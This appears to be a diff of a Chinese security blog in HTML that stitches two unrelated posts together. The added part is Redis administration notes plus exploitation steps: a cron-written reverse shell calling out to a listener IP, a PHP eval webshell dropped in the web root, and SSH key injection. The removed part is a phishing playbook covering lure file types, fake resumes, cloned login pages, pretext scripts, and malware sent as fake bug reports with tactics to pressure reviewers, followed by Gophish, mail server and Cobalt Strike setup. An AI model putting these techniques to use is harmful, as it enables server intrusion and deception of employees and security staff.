返回当前数据库的 key 的数量</span><br><span class="line">FLUSHALL                             # 删除所有数据库的所有key</span><br><span class="line">FLUSHDB                              # 删除当前数据库的所有key</span><br><span class="line">LASTSAVE                             # 返回最近一次 Redis 成功将数据保存到磁盘上的时间，以 UNIX 时间戳格式表示</span><br><span class="line">MONITOR                              # 实时打印出 Redis 服务器接收到的命令，调试用</span><br><span class="line">ROLE                                 # 返回主从实例所属的角色</span><br><span class="line">SAVE                                 # 同步保存数据到硬盘，创建当前数据库的备份</span><br><span class="line">SLAVEOF host port                    # 将当前服务器转变为指定服务器的从属服务器(slave server)</span><br><span class="line"></span><br><span class="line">4) 密码设置验证</span><br><span class="line"></span><br><span class="line">127.0.0.1:6379&gt; CONFIG get requirepass   # 查看是否设置了密码验证，默认情况下 requirepass 参数为空</span><br><span class="line"></span><br><span class="line">127.0.0.1:6379&gt; CONFIG set requirepass &quot;password&quot;  # 设置密码</span><br><span class="line"></span><br><span class="line">127.0.0.1:6379&gt; AUTH password    # 连接 redis 密码验证</span><br><span class="line"></span><br><span class="line">5) 性能测试</span><br><span class="line"></span><br><span class="line">命令格式：redis-benchmark [option] [option value]</span><br><span class="line"></span><br><span class="line">    1	-h	指定服务器主机名，默认127.0.0.1</span><br><span class="line">    2	-p	指定服务器端口.默认6379</span><br><span class="line">    3	-s	指定服务器socket	</span><br><span class="line">    4	-c	指定并发连接数，默认50</span><br><span class="line">    5	-n	指定请求数，默认10000</span><br><span class="line">    6	-d	以字节的形式指定 SET/GET 值的数据大小，默认为2</span><br><span class="line">    7	-k	1=keep alive 0=reconnect，默认为1</span><br><span class="line">    8	-r	SET/GET/INCR 使用随机 key, SADD 使用随机值	</span><br><span class="line">    9	-P	通过管道传输 &lt;numreq&gt; 请求，默认为1</span><br><span class="line">    10	-q	强制退出 redis，仅显示 query/sec 值	</span><br><span class="line">    11	--csv	以 CSV 格式输出	</span><br><span class="line">    12	-l  生成循环，永久执行测试	</span><br><span class="line">    13	-t	仅运行以逗号分隔的测试命令列表。	</span><br><span class="line">    14	-I  Idle 模式，仅打开 N 个 idle 连接并等待。</span><br><span class="line"></span><br><span class="line">eg: redis-benchmark -h 127.0.0.1 -p 6379 -t set,lpush -n 10000 -q</span><br></pre></td></tr></table></figure>
 
-在PDF、Office文档中内嵌一个跳转链接式，通过文字信息的引导，让受害者点开页面；Office、Adobe等应用软件对打开外部链接都会弹框进行安全提醒，这种方式也比较容易引起警觉
+<h3 id="5-启动方式"><a href="#5-启动方式" class="headerlink" title="5. 启动方式"></a>5. 启动方式</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">1) 指定配置文件直接启动：进入redis根目录，执行如下命令，可设置为各类用户启动</span><br><span class="line"></span><br><span class="line">./redis-server /etc/redis/redis.conf &amp;</span><br><span class="line"></span><br><span class="line">3) 开机自启动</span><br><span class="line"></span><br><span class="line">启动脚本 redis_init_script 位于位于Redis的 /utils/ 目录下</span><br><span class="line"></span><br><span class="line"># 将启动脚本复制到/etc/init.d目录下	</span><br><span class="line">cp redis_init_script /etc/init.d/redisd</span><br><span class="line"></span><br><span class="line"># 设置为开机自启动服务器</span><br><span class="line">chkconfig redisd on</span><br><span class="line"></span><br><span class="line">#打开服务</span><br><span class="line">service redisd start</span><br><span class="line"></span><br><span class="line">#关闭服务</span><br><span class="line">service redisd stop</span><br></pre></td></tr></table></figure>
 
-(2) Office宏
+<h2 id="0x02-渗透姿势"><a href="#0x02-渗透姿势" class="headerlink" title="0x02 渗透姿势"></a>0x02 渗透姿势</h2><h3 id="1-基本姿势"><a href="#1-基本姿势" class="headerlink" title="1. 基本姿势"></a>1. 基本姿势</h3><p>当Redis暴露在公网，且以root方式启动，未配置访问认证时，可通过各类写文件方式getshell，如定时任务写入反弹shell、网站根目录写入webshell、写入SSH公钥，也可利用一切可利用文件，配置各类后门；此类方式适用于物理机&#x2F;虚拟机等存在多种可利用文件的环境</p>
+<h4 id="a-定时任务"><a href="#a-定时任务" class="headerlink" title="a. 定时任务"></a>a. 定时任务</h4><p>条件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1) root启用Redis</span><br><span class="line">2) redis无密码或者弱密码</span><br></pre></td></tr></table></figure>
 
-宏是Office自带的一种高级脚本特性，通过VBA代码，可以在Office中去完成某项特定的任务，而不必再重复相同的动作，目的是让用户文档中的一些任务自动化；恶意宏代码在免杀和增加分析难度的手段上多种多样，除了把VBA代码混淆变形外，利用Excel的特性隐藏代码也很常见
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">config get dir          # 查看当前数据存储目录</span><br><span class="line">config get dbfilename   # 查看当前数据存放文件</span><br><span class="line"></span><br><span class="line">config set dir /var/spool/cron  # 设置文件写入目录</span><br><span class="line"># config set dir /etc/cron.d</span><br><span class="line">config set dbfilename root      # 设置写入文件名</span><br><span class="line"># config set dbfilename shell</span><br><span class="line">set shell &quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.143.158/9966 0&gt;&amp;1\n\n&quot;   # 新增键并赋值</span><br><span class="line"># set shell &quot;\n\n* * * * * root /bin/bash -i&gt;&amp;/dev/tcp/192.168.143.158/9966 0&gt;&amp;1\n\n&quot;  # /etc/cron.d 与 /etc/crontab</span><br><span class="line">save                            # 保存，完成文件写入</span><br><span class="line">del shell</span><br><span class="line"></span><br><span class="line">config set dir /var/lib/redis   # 设置回原来的目录         </span><br><span class="line">config set dbfilename dump.rdb  # 设置回原来的文件名</span><br></pre></td></tr></table></figure>
 
-(3) CHM文档
+<h4 id="b-webshell"><a href="#b-webshell" class="headerlink" title="b. webshell"></a>b. webshell</h4><p>条件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1) 知道网站绝对路径，并且需要增删改查权限</span><br><span class="line">2) root启动redis</span><br><span class="line">3) redis弱密码或者无密码</span><br></pre></td></tr></table></figure>
 
-CHM是Windows帮助文件（如电子书）使用的扩展名，此文件可以被植入可执行代码，Cobalt Strike就支持CHM钓鱼文件的生成。成功的利用需要欺骗用户打开恶意的CHM文件，该文件可用于执行恶意代码。其缺点就是打开时会出现弹黑框、卡顿，容易被察觉
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">config get dir          # 查看当前数据存储目录</span><br><span class="line">config get dbfilename   # 查看当前数据存放文件</span><br><span class="line"></span><br><span class="line">config set dir /usr/share/nginx/html  # 设置文件写入目录，网站根目录</span><br><span class="line">config set dbfilename shell.php       # 设置写入文件名          </span><br><span class="line"># set info &quot;\n\n&lt;?php phpinfo();?&gt;\n\n&quot; </span><br><span class="line">set shell &quot;\n\n\n&lt;?php @eval($_POST[&#x27;passw01d&#x27;]);?&gt;\n\n\n&quot; # 创建shell键并赋值                                        </span><br><span class="line">save</span><br><span class="line">del info</span><br><span class="line"></span><br><span class="line">config set dir /var/lib/redis   # 设置回原来的目录         </span><br><span class="line">config set dbfilename dump.rdb  # 设置回原来的文件名</span><br></pre></td></tr></table></figure>
 
-(4) 漏洞捆绑文档
+<h4 id="c-写公钥"><a href="#c-写公钥" class="headerlink" title="c. 写公钥"></a>c. 写公钥</h4><p>条件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1) Redis服务使用ROOT账号启动</span><br><span class="line">2) 服务器开放了SSH服务，而且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器</span><br></pre></td></tr></table></figure>
 
-利用Office、Adobe、IE等应用软件的漏洞，精心制作成诱饵文档，是APT攻击中的常客
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">1) 本机生成公钥</span><br><span class="line">ssh-keygen -t rsa -C &quot;test@mail.com&quot; -f ~/.ssh/test</span><br><span class="line"></span><br><span class="line">(echo -e &quot;\n\n&quot;;cat test.pub;echo -e &quot;\n\n&quot;) | redis-cli -h 192.168.143.143 -x set ssh_key</span><br><span class="line"></span><br><span class="line">2) 连接redis写入公钥</span><br><span class="line"></span><br><span class="line">config get dir          # 查看当前数据存储目录</span><br><span class="line">config get dbfilename   # 查看当前数据存放文件</span><br><span class="line"></span><br><span class="line">config set dir &quot;/root/.ssh&quot;</span><br><span class="line">config set dbfilename &quot;authorized_keys&quot;</span><br><span class="line">save</span><br><span class="line">del test</span><br><span class="line"></span><br><span class="line">config set dir /var/lib/redis   # 设置回原来的目录         </span><br><span class="line">config set dbfilename dump.rdb  # 设置回原来的文件名</span><br><span class="line"></span><br><span class="line">3) ssh免密登录</span><br><span class="line"></span><br><span class="line">ssh -i /root/.ssh/test root@192.168.143.143</span><br></pre></td></tr></table></figure>
 
-(5) 文件后缀RTLO
-
-RTLO字符全名为“RIGHT-TO-LEFT OVERRIDE”，是一个不可显示的控制类字符，其本质是unicode 字符。可以将任意语言的文字内容按倒序排列，最初是用来支持一些从右往左写的语言的文字，比如阿拉伯语，希伯来语。由于它可以重新排列字符的特性，会被攻击者利用从而达到欺骗目标，使得用户运行某些具有危害性的可执行文件
-
-(6) HTA文件
-
-HTA是HTML Application的缩写，直接将HTML保存成HTA的格式，是一个独立的应用软件，本身就是html应用程序，双击就能运行，却比普通网页权限大得多，它具有桌面程序的所有权限。Cobalt Strike也支持HTA钓鱼文件的生成
-
-(7) ⾃解压
-
-把⼀个恶意的⽂件和⼀个图⽚组合在⼀起，打包运⾏后，程序进⾏⾃解压，释放木马
-
-(8) ⾃解压+RLO
-
-把pe⽂件反转成png后缀、修改pe⽂件的ico图标，最后实施⾃解压操作
-</code></pre>
-<h2 id="0x02-场景案例"><a href="#0x02-场景案例" class="headerlink" title="0x02 场景案例"></a>0x02 场景案例</h2><h3 id="1-简历伪造投递"><a href="#1-简历伪造投递" class="headerlink" title="1. 简历伪造投递"></a>1. 简历伪造投递</h3><p><strong>Tips</strong></p>
-<pre><code>1. 模拟真实简历投递：在简历钓⻥邮件中，可伪造名字、联系方式、学校、经历等信息，针对不同岗位(技术、运营、产品经历等)伪造合适的简历，尽量写的漂亮
-
-2. 从官网招聘、领英、拉勾⽹、智联招聘、BOSS直聘、脉脉、v2ex、搜索引擎及其他专业论坛等渠道获取各平台留下简历投递的邮箱信息
-
-3. 简历拥有分发属性，针对HR等安全意识薄弱人员，成功率比较高
-</code></pre>
-<h3 id="2-邮件及网站伪造"><a href="#2-邮件及网站伪造" class="headerlink" title="2. 邮件及网站伪造"></a>2. 邮件及网站伪造</h3><p>购买⼀个相似域名，编写⼀摸⼀样的登录⻚⾯，访问后做引导，告知让其登录更新；或者伪造邮件服务器，发送全员及针对性邮件，诱导其点击查看邮件附件</p>
-<p><strong>话术总结</strong></p>
-<pre><code>1. 邮箱账号被异常登录、公司邮箱密码泄漏，账号密码过期，提醒修改更新密码
-
-2. 公司福利活动，请登录指定页面下载领取
-
-3. 最新爆发的漏洞通告及大型安全演练漏洞修复，请打漏洞补丁
-
-4. 系统更新迁移，云服务器包年包月过期，影响服务器列表见邮件附件
-
-5. 内部技术交流分享，请点击直播链接、附件PPT观看
-
-6. 转正评估、绩效自评及评估结果查看，请点击指定页面进行操作
-
-7. 构造钓鱼二维码，诱导员工扫描钓鱼二维码，跳转至指定钓鱼页面
-</code></pre>
-<h3 id="3-SRC假漏洞"><a href="#3-SRC假漏洞" class="headerlink" title="3. SRC假漏洞"></a>3. SRC假漏洞</h3><p>当⽬标企业存在类似SRC漏洞奖励计划时，可以去提交⼀个假漏洞，把恶意⽂件附在其中，并说是漏洞复现程序，诱导SRC审核人员打开</p>
-<p><strong>Tips</strong></p>
-<pre><code>1. 最好伪造提交核⼼应⽤高危及严重漏洞，保证“漏洞”的有效性及真实性
-
-2. 当SRC审核⼈员迟迟不点击的时候，可以施加压力，如指出漏洞危害高且影响范围广，若不及时修复承担责任；“指责”SRC人员漏洞审核水平及流程有待提升，审核时间较慢，对安全重视程度低等；其他家SRC流程如何规范、审核时效性如何高等等对比
-</code></pre>
-<h2 id="0x03-平台搭建"><a href="#0x03-平台搭建" class="headerlink" title="0x03 平台搭建"></a>0x03 平台搭建</h2><h3 id="1-环境-x2F-工具"><a href="#1-环境-x2F-工具" class="headerlink" title="1. 环境&#x2F;工具"></a>1. 环境&#x2F;工具</h3><h4 id="a-VPS"><a href="#a-VPS" class="headerlink" title="a. VPS"></a>a. VPS</h4><p>VPS(邮件服务器&#x2F;钓鱼平台&#x2F;&#x2F;CS Server)，推荐购买国外VPS，按时付费；(国内厂商监管严格、限制较多、whois信息易泄露、SMTP 端口限制)</p>
-<h4 id="b-域名"><a href="#b-域名" class="headerlink" title="b. 域名"></a>b. 域名</h4><p>购买与目标公司邮箱相近的域名</p>
-<h4 id="c-邮件服务器"><a href="#c-邮件服务器" class="headerlink" title="c. 邮件服务器"></a>c. 邮件服务器</h4><p><strong>方案一：开源自建邮件服务器</strong> - <a target="_blank" rel="noopener" href="https://github.com/gyxuehu/EwoMail">EwoMail</a></p>
-<p>Ewomail介绍</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1. 基于Linux的开源邮件服务器软件，集成了一些稳定的组件，可快速搭建，集成组件如下：</span><br><span class="line"></span><br><span class="line">	Postfix：邮件服务器</span><br><span class="line">	Dovecot：IMAP/POP3/邮件存储</span><br><span class="line">	Amavisd：反垃圾和反病毒</span><br><span class="line">	LNMP：nginx,mysql,php</span><br><span class="line">	EwoMail-Admin：WEB邮箱管理后台</span><br><span class="line">	Rainloop：webmail</span><br><span class="line"></span><br><span class="line">2. 数据可单独存储在个人服务器，防止隐私被盗取，保护数据安全</span><br></pre></td></tr></table></figure>
-
-<p>使用体验</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. 搭建方便，配置简单，采用自建邮件服务器方案较为推荐</span><br><span class="line"></span><br><span class="line">2. VPS一般会封禁25端口，需选择小众VPS厂商自建邮件服务器，或向客服申请25端口开放；对外发送邮件较麻烦</span><br><span class="line"></span><br><span class="line">3. 自建邮件服务器发送邮件容易被识别为垃圾邮件，即使配置SPF、DKIM也存在被当成垃圾邮件的情况；维护相对较麻烦</span><br></pre></td></tr></table></figure>
-
-<p><strong>方案二：专业电子邮件托管服务</strong> - <a target="_blank" rel="noopener" href="https://www.zoho.com/mail/">Zoho Mail</a></p>
-<p>使用体验</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. 基本可以避免被识别为垃圾邮件的情况</span><br><span class="line"></span><br><span class="line">2. 配置及维护方便，可避免自建邮件服务器带来的一系列问题</span><br><span class="line"></span><br><span class="line">3. 对外发送邮件基本不存在问题，SMTP默认使用465/587端口，加密传输邮件，安全性较高</span><br><span class="line"></span><br><span class="line">4. 实际使用中，与gophish钓鱼平台联动效果较好，基本不需要投入过多时间配置</span><br></pre></td></tr></table></figure>
-
-<p><em>refer：</em> <a target="_blank" rel="noopener" href="https://www.10besty.com/best-email-hosting-providers/#two">https://www.10besty.com/best-email-hosting-providers/#two</a></p>
-<h4 id="d-钓鱼平台"><a href="#d-钓鱼平台" class="headerlink" title="d. 钓鱼平台"></a>d. 钓鱼平台</h4><p><a target="_blank" rel="noopener" href="https://github.com/gophish/gophish">Gophish</a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Gophish is a powerful, open-source phishing framework that makes it easy to test your organization&#x27;s exposure to phishing</span><br></pre></td></tr></table></figure>
-
-<h4 id="e-红队平台"><a href="#e-红队平台" class="headerlink" title="e. 红队平台"></a>e. 红队平台</h4><p><a target="_blank" rel="noopener" href="https://blog.cobaltstrike.com/">Cobalt Strike</a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">一款优秀的红队攻击平台，主要用于执行有目标的攻击和模拟高级威胁者的后渗透行动；本文主要用此制作钓鱼诱饵、载荷投递及远控，CS的Spear Phish模块也可进行钓鱼测试</span><br></pre></td></tr></table></figure>
-
-<h3 id="2-邮件服务器"><a href="#2-邮件服务器" class="headerlink" title="2. 邮件服务器"></a>2. 邮件服务器</h3><h4 id="a-Ewomail"><a href="#a-Ewomail" class="headerlink" title="a. Ewomail"></a>a. Ewomail</h4><p>参考<a target="_blank" rel="noopener" href="http://doc.ewomail.com/docs/ewomail/jianjie">EwoMail 邮件服务器(开源版文档)</a>进行邮件服务器的搭建</p>
-<p><strong>邮件基础</strong></p>
-<table>
-<thead>
-<tr>
-<th>简称</th>
-<th>全名</th>
-<th>任务</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>MUA</td>
-<td>Mail User Agent</td>
-<td>供用户写信、读信、寄信的软件。寄信时，以SMTP协议将邮件提交给MTA ；收信时 ，以POP或IMAP协议访问服务器上的邮箱</td>
-</tr>
-<tr>
-<td>MTA</td>
-<td>Mail Transfer Agent</td>
-<td>负责接收、递送邮件的服务器软件。决定邮件的递送路径，进行必要的地址改写。应该由本地系统收下的邮件，委托给MDA进行最后的投递操作</td>
-</tr>
-<tr>
-<td>MDA</td>
-<td>Mail Delivery Agent</td>
-<td>负责投递本地邮件到适当的邮箱，MDA可以过滤邮件内容，或是依照用户设定的准则，将邮件分类到适当的邮箱；甚至可以将邮件转回给MTA，以寄到另一个邮箱</td>
-</tr>
-</tbody></table>
-<p><strong>注意事项</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1. 服务器VPS需要干净环境，要求全新干净系统，最好单独供Ewomail使用，不能安装在已有的nginx,mysql的环境中</span><br><span class="line"></span><br><span class="line">2. 新版本的杀毒软件占用的内存比较多，可参考(http://doc.ewomail.com/docs/ewomail/reduce_memory)降低内存占用</span><br><span class="line"></span><br><span class="line">3. webmail https证书配置：系统自带了本地SSL证书，但未经认证；可使用经互联网经认证的证书，如通过 Let’s Encrypt、Cloudlare等申请免费可信证书</span><br><span class="line"></span><br><span class="line">4. 开放端口：必须打开的端口8000(webmail)，8010(管理后台)，25(SMTP)，143(IMAP)；可修改</span><br><span class="line"></span><br><span class="line">5. DKIM设置：推荐设置域名密钥识别邮件标准，用来防止被判定为垃圾邮件；参考(http://doc.ewomail.com/docs/ewomail/dkim)</span><br></pre></td></tr></table></figure>
-
-<p><strong>问题总结</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1. 无法连接服务器：邮件无法发送、接收等</span><br><span class="line"></span><br><span class="line">a. 检查VPS服务商是否开放25端口出站方向，如未开放可通过工单、客服等联系运营商申请开放25端口出站方向；或使用465等其他端口发送邮件</span><br><span class="line"></span><br><span class="line">b. 25端口正常的情况下，如果不能链接服务器，请检查域名DNS解析，或做内部通信</span><br><span class="line"></span><br><span class="line">2. 域不允许</span><br><span class="line"></span><br><span class="line">a. 当显示域不允许的时候，先检查域名解析是否已做好，如果只在本地搭建测试，测试内部通信是否正常</span><br><span class="line">	</span><br><span class="line">b. 如以上2个步骤还不行，参考自定义访问路径文章(http://doc.ewomail.com/docs/ewomail/custom_path)，填上具体的访问地址</span><br></pre></td></tr></table></figure>
-
-<p><strong>配置&#x2F;命令</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">1. 默认安装及配置目录</span><br><span class="line"></span><br><span class="line">/ewomail</span><br><span class="line">.</span><br><span class="line">├── config.ini</span><br><span class="line">├── dkim</span><br><span class="line">├── mail</span><br><span class="line">├── mysql</span><br><span class="line">├── nginx</span><br><span class="line">├── php72</span><br><span class="line">└── www</span><br><span class="line"></span><br><span class="line">2. 管理后台、webmail的nginx配置</span><br><span class="line"></span><br><span class="line">/ewomail/nginx/conf/vhost</span><br><span class="line"></span><br><span class="line">├── ewomail-admin.conf      //管理后台</span><br><span class="line">├── phpmyadmin.conf         //数据库</span><br><span class="line">├── rainloop.conf           //webmail</span><br><span class="line">└── rainloop.conf.ssl       //webmail ssl配置</span><br><span class="line"></span><br><span class="line">3. PHP配置文件: 可修改后台管理或webmail的访问路径</span><br><span class="line"></span><br><span class="line">/ewomail/www/ewomail-admin/core/config.php</span><br><span class="line">	</span><br><span class="line">├── &#x27;url&#x27; =&gt; &#x27;ewomail后台访问路径&#x27;</span><br><span class="line">└── &#x27;webmail_url&#x27; =&gt; &#x27;webmail的访问路径&#x27;</span><br><span class="line"></span><br><span class="line">4. 卸载命令</span><br><span class="line"></span><br><span class="line">$ systemctl stop nginx php-fpm mysqld postfix dovecot amavisd</span><br><span class="line"></span><br><span class="line">$ rm -rf /ewomail</span><br><span class="line"></span><br><span class="line">5. 重启命令</span><br><span class="line"></span><br><span class="line">$ systemctl restart nginx php-fpm mysqld postfix dovecot amavisd</span><br><span class="line"></span><br><span class="line">6. 组件查找</span><br><span class="line"></span><br><span class="line">$ yum install mlocate &amp;&amp; updatedb   // 安装locate所在文件包并更新搜索数据库</span><br><span class="line">	</span><br><span class="line">$ locate amavisd   //查找邮件内容过滤器amavised相关文件/文件夹</span><br></pre></td></tr></table></figure>
-
-<p><strong>管理后台</strong></p>
-<p><img src="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/ewomail.png"></p>
-<p><strong>Webmail</strong></p>
-<p><img src="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/webmail.png"></p>
-<h4 id="b-Zoho-Mail"><a href="#b-Zoho-Mail" class="headerlink" title="b. Zoho Mail"></a>b. Zoho Mail</h4><p>参考官方文档 <a target="_blank" rel="noopener" href="https://www.zoho.com/mail/help/adminconsole/email-hosting-setup.html">Email Hosting Setup in Zoho</a> 进行申请、配置；配置完成后如下：</p>
-<p><img src="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/zoho.png"></p>
-<p>SMTP服务配置可参考 <a target="_blank" rel="noopener" href="https://www.zoho.com/mail/help/zoho-smtp.html">SMTP Server Configuration - Zoho Mail</a>，完成后在<code>gophish</code>中进行Sending Profiles-邮箱配置</p>
-<p><img src="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/profile.png"></p>
-<p><img src="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/send.png"></p>
-<p><code>采用此方案，对外发送邮件基本没什么问题，也不用担心被识别为垃圾邮件</code></p>
-<h3 id="3-钓鱼平台"><a href="#3-钓鱼平台" class="headerlink" title="3. 钓鱼平台"></a>3. 钓鱼平台</h3><p><strong>安装运行</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">1. 下载解压</span><br><span class="line"></span><br><span class="line">$ wget https://github.com/gophish/gophish/releases/download/v0.11.0/gophish-v0.11.0-linux-64bit.zip</span><br><span class="line"></span><br><span class="line">$ unzip gophish-v0.11.0-linux-64bit.zip -d gophish</span><br><span class="line"></span><br><span class="line">2. 修改配置(config.json)</span><br><span class="line"></span><br><span class="line">admin_server是后台管理页面，将127.0.0.1 改为 0.0.0.0，默认开放的端口3333。phish_server是钓鱼网站，默认开放80端口</span><br><span class="line"></span><br><span class="line">3. 启动运行</span><br><span class="line"></span><br><span class="line">$ cd gophish &amp;&amp; chmod 640 config.json &amp;&amp; chmod +x gophish</span><br><span class="line"></span><br><span class="line">$ nohup ./gophish &amp;  //后台运行，日志记录至nohup.out文件</span><br><span class="line"></span><br><span class="line">成功启动后，在nohup.out文件中的初始账户密码可用来登录控制台</span><br><span class="line"></span><br><span class="line">4. 首次登录强制修改密码，要求八位以上字符</span><br><span class="line"></span><br><span class="line">地址：https://x.x.x.x:3333/</span><br></pre></td></tr></table></figure>
-
-<p><strong>功能介绍</strong></p>
-<p><img src="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/phish.png"></p>
-<center>功能|<center>简述
----|---
-Dashboard|仪表板，查看整体钓鱼情况
-Campaigns|作战配置，每次攻击前需要配置一次
-Users & Groups|用户和用户组（添加需要进行钓鱼的邮箱和相关信息）
-Email Templates|电子邮件模板
-Landing Pages|需要伪造的钓鱼页面
-Sending Profiles|钓鱼邮箱发送配置
-Account Settings|账户、UI、报告等设置
-
-<h3 id="4-CS-平台"><a href="#4-CS-平台" class="headerlink" title="4. CS 平台"></a>4. CS 平台</h3><p>搭建及使用可参考<a target="_blank" rel="noopener" href="https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf">A-Team: Cobalt Strike 4.0 手册</a>及<a target="_blank" rel="noopener" href="https://wbglil.gitbook.io/cobalt-strike/">Cobalt Strike Book</a></p>
-<p><strong>目录简介</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">➜  CobaltStrike4.1 tree -L 1</span><br><span class="line">.</span><br><span class="line">├── agscript               //[拓展应用的脚本]</span><br><span class="line">├── agscript.bat</span><br><span class="line">├── c2lint                 //[检查c2配置文件语法和预览]</span><br><span class="line">├── c2lint.bat</span><br><span class="line">├── cobaltstrike           //[客户端启动程序]</span><br><span class="line">├── cobaltstrike.auth</span><br><span class="line">├── cobaltstrike.bat       //[CS Windows客户端启动程序]</span><br><span 